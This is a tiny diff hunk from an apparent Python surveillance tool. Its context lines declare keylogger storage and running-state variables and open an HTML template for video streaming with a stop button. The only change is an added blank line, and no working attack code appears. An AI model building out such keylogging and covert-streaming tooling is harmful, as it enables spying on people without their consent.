@@ -16,6 +16,7 @@ streaming = False
 keylogger_data = []  # List to store keylogger data
 keylogger_running = False  # Flag to check if keylogger is running
 
+
 # HTML template for video streaming with a stop button
 html_template = """
 <!doctype html>
